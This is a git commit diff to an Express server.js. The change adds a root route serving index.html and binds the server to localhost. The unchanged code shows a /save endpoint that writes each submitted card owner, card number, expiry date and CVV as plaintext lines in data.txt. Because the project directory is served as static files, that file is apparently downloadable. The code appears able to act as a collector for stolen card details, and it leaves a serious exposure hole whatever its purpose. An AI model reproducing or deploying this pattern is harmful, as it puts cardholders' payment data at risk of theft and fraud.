f024a1a56db8f28ce6162bfbe40079dc42f2f207
carpet1994 <94118860+carpet1994@users.noreply.github.com>
2026-05-22 16:08:55 +0200

    Update server to serve index.html and improve listening

--- server.js
+++ server.js
@@ -4,18 +4,24 @@ const path = require('path');
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 const filePath = path.join(__dirname, 'data.txt');
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
 
 app.post('/save', (req, res) => {
   const { owner, cardNumber, expValue, cvvValue } = req.body;
   const line = `owner=${owner} | card=${cardNumber} | exp=${expValue} | cvv=${cvvValue}
 `;
+
   fs.appendFile(filePath, line, (err) => {
     if (err) return res.status(500).send('error');
     res.send('ok');
   });
 });
 
-app.listen(5555, () => console.log('http://localhost:5555'));
+app.listen(5555, '127.0.0.1', () => console.log('http://127.0.0.1:5555'));
